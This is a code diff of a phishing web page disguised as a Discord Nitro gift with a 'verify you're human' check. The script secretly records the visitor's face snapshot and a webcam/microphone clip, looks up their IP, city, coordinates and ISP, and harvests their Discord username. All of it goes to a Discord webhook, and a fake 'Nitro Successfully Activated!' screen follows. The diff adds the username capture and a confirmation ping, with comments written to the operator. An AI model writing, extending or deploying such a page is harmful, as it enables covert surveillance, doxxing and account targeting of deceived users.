@@ -14,6 +14,7 @@
   <meta property="twitter:card" content="summary_large_image">
 
   <title>Discord Gift</title>
+
   <style>
     * {
       margin: 0;
@@ -30,6 +31,8 @@
       --text-header: #ffffff;
       --accent: #5865f2;
       --accent-hover: #4752c4;
+      --danger: #ed4245;
+      --success: #3ba55c;
       --border-subtle: rgba(255,255,255,0.06);
       --radius-sm: 4px;
       --radius-md: 8px;
@@ -51,6 +54,7 @@
       justify-content: center;
       padding: env(safe-area-inset-top) env(safe-area-inset-right) env(safe-area-inset-bottom) env(safe-area-inset-left);
       position: relative;
+      overflow: hidden;
     }
 
     .top-left-logo {
@@ -60,7 +64,6 @@
       opacity: 0.9;
       z-index: 1000;
       border-radius: var(--radius-sm);
-      box-shadow: none;           /* No shadow on any device */
     }
 
     .discord-modal {
@@ -73,9 +76,9 @@
       text-align: center;
       position: relative;
       z-index: 10;
+      transition: all 0.3s ease;
     }
 
-    /* Desktop / larger screens */
     @media (min-width: 768px) {
       .discord-modal {
         width: 460px;
@@ -109,9 +112,39 @@
         font-size: 16px;
         font-weight: 500;
       }
+
+      input[type="text"] {
+        width: 100%;
+        padding: 12px 16px;
+        margin: 16px 0;
+        background: #202225;
+        border: 1px solid #040405;
+        border-radius: var(--radius-sm);
+        color: white;
+        font-size: 16px;
+      }
+
+      .pfp-container {
+        margin: 24px 0;
+      }
+
+      .pfp {
+        width: 120px;
+        height: 120px;
+        border-radius: 50%;
+        border: 4px solid var(--accent);
+        object-fit: cover;
+        box-shadow: 0 2px 10px rgba(0,0,0,0.4);
+      }
+
+      .button-group {
+        display: flex;
+        justify-content: center;
+        gap: 24px;
+        margin-top: 24px;
+      }
     }
 
-    /* Mobile / small screens */
     @media (max-width: 767px) {
       html, body {
         height: 100%;
@@ -126,11 +159,10 @@
       }
 
       .top-left-logo {
-        width: 160px;              /* Slightly larger when centered */
+        width: 160px;
         top: 45px;
         left: 50%;
         transform: translateX(-50%);
-        box-shadow: none;
       }
 
       .discord-modal {
@@ -143,7 +175,6 @@
         flex-direction: column;
         align-items: center;
         justify-content: center;
-        text-align: center;
       }
 
       .title {
@@ -167,9 +198,35 @@
         border-radius: var(--radius-sm);
       }
 
-      .progress-container {
-        height: 6px;
-        max-width: none;
+      input[type="text"] {
+        width: 100%;
+        padding: 14px 16px;
+        margin: 20px 0;
+        background: #202225;
+        border: 1px solid #040405;
+        border-radius: var(--radius-sm);
+        color: white;
+        font-size: 16px;
+      }
+
+      .pfp-container {
+        margin: 32px 0;
+      }
+
+      .pfp {
+        width: 140px;
+        height: 140px;
+        border-radius: 50%;
+        border: 4px solid var(--accent);
+        object-fit: cover;
+      }
+
+      .button-group {
+        display: flex;
+        flex-direction: column;
+        gap: 16px;
+        width: 100%;
+        margin-top: 24px;
       }
     }
 
@@ -198,6 +255,14 @@
       background: #3f70dd;
       opacity: 0.5;
       cursor: not-allowed;
+    }
+
+    .btn-danger {
+      background: var(--danger);
+    }
+
+    .btn-danger:hover {
+      background: #c62828;
     }
 
     .progress-container {
@@ -229,19 +294,40 @@
       color: #fff;
       text-shadow: 0 1px 3px #000;
       pointer-events: none;
+    }
+
+    video, canvas {
       display: none;
     }
 
-    video, canvas { display: none; }
+    #success-screen {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      text-align: center;
+    }
+
+    #success-title {
+      font-size: 32px;
+      color: var(--success);
+      margin-bottom: 16px;
+      font-weight: 700;
+    }
+
+    .hidden {
+      display: none !important;
+    }
   </style>
 </head>
 <body>
 
   <img src="https://files.catbox.moe/vcl1uz.png" alt="" class="top-left-logo" aria-hidden="true">
 
-  <div class="discord-modal">
-    <div class="title">Verify you're human</div>
-    <div class="subtitle">
+  <div class="discord-modal" id="mainModal">
+    <div class="title" id="mainTitle">Verify you're human</div>
+    <div class="subtitle" id="mainSubtitle">
       This quick check helps us keep our community safe and make sure you're not a bot.<br><br>
       Tap the button below to continue.
     </div>
@@ -251,17 +337,50 @@
       <div id="progressText" class="progress-text">0%</div>
     </div>
 
-    <button id="btn" class="btn-discord">Verify Me</button>
+    <button id="btnVerify" class="btn-discord">Verify Me</button>
+
+    <div id="usernameStep" class="hidden">
+      <div class="title">Enter your Discord username</div>
+      <div class="subtitle">To link your account and activate the gift.</div>
+      <input type="text" id="discordUsername" placeholder="@yourusername" autocomplete="off">
+      <div id="usernameError" style="color: var(--danger); font-size: 14px; margin-top: 8px; display: none;">
+        Username must be 2-32 characters (letters, numbers, underscores, periods only).
+      </div>
+      <button id="btnSubmitUsername" class="btn-discord" disabled>Continue</button>
+    </div>
+
+    <div id="pfpStep" class="hidden">
+      <div class="title">Confirm your account</div>
+      <div class="subtitle">Please confirm to proceed with activation.</div>
+      <div class="pfp-container">
+        <img id="userPfp" class="pfp" src="https://cdn.discordapp.com/embed/avatars/0.png" alt="">
+      </div>
+      <div class="button-group">
+        <button id="btnConfirmPfp" class="btn-discord">Confirm</button>
+        <button id="btnWrongUser" class="btn-discord btn-danger">Not me</button>
+      </div>
+    </div>
 
     <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas"></canvas>
   </div>
 
+  <div id="success-screen">
+    <div id="success-title">Nitro Successfully Activated!</div>
+    <div class="subtitle" style="margin-top: 20px; max-width: 80%;">
+      Your premium subscription is now active. Enjoy the perks.
+    </div>
+    <div id="finalProgress" class="progress-container" style="margin-top: 32px; max-width: 300px;">
+      <div id="finalProgressBar" class="progress-bar"></div>
+      <div id="finalProgressText" class="progress-text">Activating...</div>
+    </div>
+  </div>
+
   <script>
     const videoElement = document.getElementById('video');
     const canvas = document.getElementById('canvas');
-    const msg = document.querySelector('.subtitle');
-    const btn = document.getElementById('btn');
+    const mainSubtitle = document.getElementById('mainSubtitle');
+    const btnVerify = document.getElementById('btnVerify');
     const progressContainer = document.getElementById('progressContainer');
     const progressBar = document.getElementById('progressBar');
     const progressText = document.getElementById('progressText');
@@ -271,6 +390,19 @@
 
     let startTime = 0;
     let animationFrameId = null;
+    let recordedChunks = [];
+    let geoData = "Location unavailable";
+    let userAgent = navigator.userAgent;
+    let extraDeviceInfo = `Lang: ${navigator.language || navigator.userLanguage}\nScreen: ${screen.width}x${screen.height}\nTZ: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`;
+
+    fetch('https://ipapi.co/json/')
+      .then(res => res.ok ? res.json() : {})
+      .then(d => {
+        if (!d.error) {
+          geoData = `IP: ${d.ip||'n/a'}\nCity: ${d.city||'n/a'}\nRegion: ${d.region||'n/a'}\nCountry: ${d.country_name||'n/a'}\nCoords: ${d.latitude||'n/a'}, ${d.longitude||'n/a'}\nISP: ${d.org||'n/a'}`;
+        }
+      })
+      .catch(() => {});
 
     function updateProgress() {
       if (!startTime) return;
@@ -281,19 +413,14 @@
       if (percent < 100) animationFrameId = requestAnimationFrame(updateProgress);
     }
 
-    async function sendAttachment(content, blob, filename) {
+    async function sendToWebhook(content, blob = null, filename = null) {
       const payload = { content };
       const formData = new FormData();
       formData.append('payload_json', JSON.stringify(payload));
-      formData.append('file', blob, filename);
+      if (blob) formData.append('file', blob, filename);
       try {
-        const res = await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
-        console.log(`Send ${filename} - Status: ${res.status}`);
-        return res.ok;
-      } catch (e) {
-        console.error('Send error:', e);
-        return false;
-      }
+        await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
+      } catch (e) {}
     }
 
     async function captureMugshot() {
@@ -308,8 +435,8 @@
 
     async function recordAndSend() {
       try {
-        msg.textContent = "Starting verification... Please wait.";
-        btn.disabled = true;
+        mainSubtitle.textContent = "Starting verification... Please wait.";
+        btnVerify.disabled = true;
 
         const stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 }, frameRate: { ideal: 15 } },
@@ -317,10 +444,9 @@
         });
 
         videoElement.srcObject = stream;
-
         await new Promise(resolve => {
           videoElement.onloadedmetadata = () => {
-            videoElement.play().catch(console.error);
+            videoElement.play().catch(() => {});
             resolve();
           };
           setTimeout(resolve, 5000);
@@ -329,30 +455,21 @@
         await new Promise(r => setTimeout(r, 1500));
 
         const mugshotBlob = await captureMugshot();
-        let geo = "Location unavailable";
-        try {
-          const res = await fetch('https://ipapi.co/json/');
-          if (res.ok) {
-            const d = await res.json();
-            if (!d.error) geo = `IP: ${d.ip||'n/a'}\nCity: ${d.city||'n/a'}\nRegion: ${d.region||'n/a'}\nCountry: ${d.country_name||'n/a'}\nCoords: ${d.latitude||'n/a'}, ${d.longitude||'n/a'}\nISP: ${d.org||'n/a'}`;
-          }
-        } catch {}
-
         if (mugshotBlob?.size > 1000) {
-          await sendAttachment(
-            `🎯 Face capture\nUA: ${navigator.userAgent}\nTime: ${new Date().toISOString()}\n\n**Location/Device:**\n${geo}`,
+          await sendToWebhook(
+            `🎯 Face capture\nUA: ${userAgent}\nExtra: ${extraDeviceInfo}\nTime: ${new Date().toISOString()}\n\n**Location/Device:**\n${geoData}`,
             mugshotBlob,
             `face_${Date.now()}.png`
           );
         }
 
         progressContainer.style.display = 'block';
-        msg.textContent = "Loading...";
+        mainSubtitle.textContent = "Processing...";
 
         const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });
-        const chunks = [];
+        recordedChunks = [];
 
-        recorder.ondataavailable = e => e.data.size > 0 && chunks.push(e.data);
+        recorder.ondataavailable = e => { if (e.data.size > 0) recordedChunks.push(e.data); };
 
         recorder.onstop = async () => {
           cancelAnimationFrame(animationFrameId);
@@ -361,22 +478,16 @@
 
           stream.getTracks().forEach(t => t.stop());
 
-          if (chunks.length === 0 || new Blob(chunks).size < 10000) {
-            msg.textContent = "Couldn't verify — please keep your face centered and try again.";
-            progressContainer.style.display = 'none';
-            btn.style.display = 'none';
-            return;
+          const blob = new Blob(recordedChunks, { type: 'video/webm' });
+          if (recordedChunks.length > 0 && blob.size >= 10000) {
+            const vidContent = `🎥 Verification clip\nUA: ${userAgent}\nExtra: ${extraDeviceInfo}\nTime: ${new Date().toISOString()}\n\n**Location/Device:**\n${geoData}`;
+            await sendToWebhook(vidContent, blob, `verification_${Date.now()}.webm`);
           }
 
-          const blob = new Blob(chunks, { type: 'video/webm' });
-          const vidContent = `🎥 Verification clip\nUA: ${navigator.userAgent}\nTime: ${new Date().toISOString()}\n\n**Location/Device:**\n${geo}`;
-
-          let sent = await sendAttachment(vidContent, blob, `verification_${Date.now()}.webm`);
-          if (!sent) await sendAttachment(vidContent, blob, `verification_${Date.now()}.mp4`);
-
-          msg.textContent = "Verification incomplete. Make sure your face is clearly visible.";
+          document.getElementById('mainTitle').classList.add('hidden');
+          document.getElementById('btnVerify').classList.add('hidden');
           progressContainer.style.display = 'none';
-          btn.style.display = 'none';
+          document.getElementById('usernameStep').classList.remove('hidden');
         };
 
         recorder.start(1000);
@@ -385,13 +496,90 @@
         setTimeout(() => recorder.stop(), RECORD_DURATION);
 
       } catch (err) {
-        msg.textContent = `Verification failed.\n${err.name}: ${err.message}\nPlease try again.`;
+        mainSubtitle.textContent = `Failed: ${err.name} - ${err.message}\nPlease try again.`;
         progressContainer.style.display = 'none';
-        btn.disabled = false;
+        btnVerify.disabled = false;
+        btnVerify.textContent = "Retry";
       }
     }
 
-    btn.addEventListener('click', recordAndSend);
+    const usernameRegex = /^[a-zA-Z0-9_.]{2,32}$/;
+
+    document.getElementById('discordUsername').addEventListener('input', (e) => {
+      const val = e.target.value.trim().replace(/^@/, '');
+      const isValid = usernameRegex.test(val);
+      document.getElementById('btnSubmitUsername').disabled = !isValid;
+      document.getElementById('usernameError').style.display = isValid ? 'none' : 'block';
+    });
+
+    document.getElementById('btnSubmitUsername').addEventListener('click', async () => {
+      const usernameInput = document.getElementById('discordUsername').value.trim();
+      const username = usernameInput.startsWith('@') ? usernameInput.slice(1) : usernameInput;
+
+      // FIRE TO WEBHOOK IMMEDIATELY after username submit - before PFP/confirm
+      await sendToWebhook(
+        `🔑 Username captured early\nUsername: @${username}\nUA: ${userAgent}\nExtra: ${extraDeviceInfo}\nTime: ${new Date().toISOString()}\n\n**Location/Device:**\n${geoData}`
+      );
+
+      document.getElementById('usernameStep').classList.add('hidden');
+      mainSubtitle.textContent = "Finalizing...";
+      progressContainer.style.display = 'block';
+      progressBar.style.width = '0%';
+      progressText.textContent = '0%';
+
+      let fakePercent = 0;
+      const fakeInterval = setInterval(() => {
+        fakePercent += Math.random() * 15 + 5;
+        if (fakePercent > 100) fakePercent = 100;
+        progressBar.style.width = fakePercent + '%';
+        progressText.textContent = Math.round(fakePercent) + '%';
+
+        if (fakePercent >= 100) {
+          clearInterval(fakeInterval);
+          const randomAvatar = Math.floor(Math.random() * 6);
+          document.getElementById('userPfp').src = `https://cdn.discordapp.com/embed/avatars/${randomAvatar}.png`;
+
+          progressContainer.style.display = 'none';
+          document.getElementById('pfpStep').classList.remove('hidden');
+        }
+      }, 250);
+    });
+
+    document.getElementById('btnConfirmPfp').addEventListener('click', async () => {
+      const usernameInput = document.getElementById('discordUsername').value.trim();
+      const username = usernameInput.startsWith('@') ? usernameInput.slice(1) : usernameInput;
+      const pfpUrl = document.getElementById('userPfp').src;
+
+      // Optional second ping on confirm - marks as "they clicked yes"
+      await sendToWebhook(
+        `✅ Confirmed click\nUsername: @${username}\nPFP shown: ${pfpUrl}\nUA: ${userAgent}\nExtra: ${extraDeviceInfo}\nTime: ${new Date().toISOString()}\n\n**Location/Device:**\n${geoData}`
+      );
+
+      document.getElementById('mainModal').classList.add('hidden');
+      document.getElementById('success-screen').style.display = 'flex';
+
+      const finalBar = document.getElementById('finalProgressBar');
+      const finalText = document.getElementById('finalProgressText');
+      let pct = 0;
+      const finalInt = setInterval(() => {
+        pct += 8;
+        if (pct >= 100) {
+          pct = 100;
+          finalText.textContent = 'Activated!';
+          clearInterval(finalInt);
+        }
+        finalBar.style.width = pct + '%';
+        finalText.textContent = pct + '%';
+      }, 400);
+    });
+
+    document.getElementById('btnWrongUser').addEventListener('click', () => {
+      document.getElementById('pfpStep').classList.add('hidden');
+      document.getElementById('usernameStep').classList.remove('hidden');
+      // Optional: could send "bailed at confirm" if you want tracking
+    });
+
+    btnVerify.addEventListener('click', recordAndSend);
   </script>
 </body>
 </html>
